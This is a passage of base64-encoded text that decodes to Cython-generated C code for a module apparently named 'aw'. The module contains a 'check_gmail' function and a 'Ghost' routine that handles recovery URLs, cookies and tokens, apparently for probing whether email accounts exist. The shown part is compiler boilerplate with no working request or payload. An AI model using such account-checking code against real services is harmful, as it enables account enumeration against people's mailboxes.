WNrKDMsIF9fcHl4X3RfNSwgX19weXhfdF8xMywgX19weXhfdF84KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE2NiwgX19weXhfTDE2X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xNCwgX19weXhfdF8xMSwgTlVMTCk7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAxNjYsIF9fcHl4X0wxNl9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xOSk7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKICAgICAgICAgICAgICBpZiAoX19weXhfdF8xMCA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NiwgX19weXhfTDE2X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICBfX3B5eF90XzIwID0gKCFfX3B5eF90XzEwKTsKICAgICAgICAgICAgICBpZiAodW5saWtlbHkoX19weXhfdF8yMCkpIHsKICAgICAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF81KTsKICAgICAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8xMyk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZShfX3B5eF90XzUsIF9fcHl4X3RfMTMsIF9fcHl4X3RfOCk7CiAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwOyAgX19weXhfdF8xMyA9IDA7ICBfX3B5eF90XzggPSAwOyAKICAgICAgICAgICAgICAgIF9fUFlYX0VSUigwLCAxNjYsIF9fcHl4X0wxNl9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgICAgICAgZ290byBfX3B5eF9MMTVfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19weXhfTDE2X2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTUsIF9fcHl4X3RfMTYsIF9fcHl4X3RfMTcpOwogICAgICAgICAgICBnb3RvIF9fcHl4X0wzX2Vycm9yOwogICAgICAgICAgICBfX3B5eF9MMTVfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNik7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTcpOwogICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE1LCBfX3B5eF90XzE2LCBfX3B5eF90XzE3KTsKICAgICAgICAgICAgX19weXhfTDE5X3RyeV9lbmQ6OwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAgewogICAgICAgICAgewogICAgICAgICAgICBpZiAoX19weXhfdF8xNCkgewogICAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdLCBOVUxMKTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNykpIF9fUFlYX0VSUigwLCAxNjYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGdvdG8gX19weXhfTDEzOwogICAgICAgICAgfQogICAgICAgICAgX19weXhfTDEzOjsKICAgICAgICB9CiAgICAgICAgZ290byBfX3B5eF9MMjM7CiAgICAgICAgX19weXhfTDEwX2Vycm9yOjsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDNfZXJyb3I7CiAgICAgICAgX19weXhfTDIzOjsKICAgICAgfQoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7CiAgICBfX3B5eF9MM19lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgIAogICAgX19weXhfdF8yMSA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTsKICAgIGlmIChfX3B5eF90XzIxKSB7CiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiYXcuR2hvc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF84LCAmX19weXhfdF8xMywgJl9fcHl4X3RfNSkgPCAwKSBfX1BZWF9FUlIoMCwgMTY4LCBfX3B5eF9MNV9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEzKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMyk7CiAgICAgIF9fcHl4X3ZfZSA9IF9fcHl4X3RfMTM7CiAgICAgICB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNCA9IE5VTEw7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogICAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9HaG9zdF9lcnJvcl9pbl9mdW5jdGlvbiwgX19weXhfdl9lfTsKICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDMtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNjksIF9fcHl4X0wyOV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgICB9CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF82ID0gTlVMTDsKICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTcwLCBfX3B5eF9MMjlfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgX19weXhfdF85ID0gMTsKICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNCkpKSB7CiAgICAgICAgICBfX3B5eF90XzYgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpOwogICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNik7CiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzQsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBOVUxMfTsKICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNzAsIF9fcHl4X0wyOV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgICB9CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgfQoKICAgICAgCiAgICAgICB7CiAgICAgICAgewogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICBnb3RvIF9fcHl4X0wzMDsKICAgICAgICB9CiAgICAgICAgX19weXhfTDI5X2Vycm9yOjsKICAgICAgICB7CiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAgICAgICBfX3B5eF90XzE0ID0gMDsgX19weXhfdF8xNyA9IDA7IF9fcHl4X3RfMTYgPSAwOyBfX3B5eF90XzE1ID0gMDsgX19weXhfdF8xOSA9IDA7IF9fcHl4X3RfMjQgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8xNSwgJl9fcHl4X3RfMTksICZfX3B5eF90XzI0KTsKICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzE0LCAmX19weXhfdF8xNywgJl9fcHl4X3RfMTYpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzE0LCAmX19weXhfdF8xNywgJl9fcHl4X3RfMTYpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOSk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjQpOwogICAgICAgICAgX19weXhfdF8yMSA9IF9fcHl4X2xpbmVubzsgX19weXhfdF8yMiA9IF9fcHl4X2NsaW5lbm87IF9fcHl4X3RfMjMgPSBfX3B5eF9maWxlbmFtZTsKICAgICAgICAgIHsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICB9CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yNCk7CiAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE1LCBfX3B5eF90XzE5LCBfX3B5eF90XzI0KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTsKICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF8xNCwgX19weXhfdF8xNywgX19weXhfdF8xNik7CiAgICAgICAgICBfX3B5eF90XzE0ID0gMDsgX19weXhfdF8xNyA9IDA7IF9fcHl4X3RfMTYgPSAwOyBfX3B5eF90XzE1ID0gMDsgX19weXhfdF8xOSA9IDA7IF9fcHl4X3RfMjQgPSAwOwogICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8yMTsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMjI7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8yMzsKICAgICAgICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yOwogICAgICAgIH0KICAgICAgICBfX3B5eF9MMzA6OwogICAgICB9CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgZ290byBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDsKICAgIH0KICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yOwoKICAgIAogICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpOwogICAgX19weXhfTDhfdHJ5X2VuZDo7CiAgfQoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsKICBfX1B5eF9BZGRUcmFjZWJhY2soImF3Lkdob3N0IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9uMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X24yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaG9zdCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZWNvdmVyeV91cmwpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXMxKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfbWF0Y2gpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl90b2spOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9jb29raWVzKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaGVhZGVyczIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl90b2tlbl9saW5lKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfZ2JfMmF3XzVHaG9zdF8yZ2VuZXJhdG9yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X2diXzJhd181R2hvc3RfNWdlbmVyYXRvcjEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfZ2JfMmF3XzVHaG9zdF84Z2VuZXJhdG9yMik7CiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmF3XzljaGVja19nbWFpbChQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJhd185Y2hlY2tfZ21haWwgPSB7ImNoZWNrX2dtYWlsIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18yYXdfOWNoZWNrX2dtYWlsLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJhd185Y2hlY2tfZ21haWwoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsID0gMDsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzOwogICNlbmRpZgogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlczsKICBQeU9iamVjdCogdmFsdWVzWzFdID0gezB9OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImNoZWNrX2dtYWlsICh3cmFwcGVyKSIsIDApOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7CiAgI2Vsc2UKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMOwogICNlbmRpZgogICNlbmRpZgogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIHsKICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VtYWlsLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDE3NiwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxNzYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJjaGVja19nbWFpbCIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMTc2LCBfX3B5eF9MM19lcnJvcikKICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDE7IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY2hlY2tfZ21haWwiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDE3NiwgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAxKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxNzYsIF9fcHl4X0wzX2Vycm9yKQogICAgfQogICAgX19weXhfdl9lbWFpbCA9IHZhbHVlc1swXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY2hlY2tfZ21haWwiLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAxNzYsIF9fcHl4X0wzX2Vycm9yKQogIF9fcHl4X0w2X3NraXA6OwogIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7CiAgX19weXhfTDNfZXJyb3I6OwogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJhdy5jaGVja19nbWFpbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMmF3XzhjaGVja19nbWFpbChfX3B5eF9zZWxmLCBfX3B5eF92X2VtYWlsKTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0K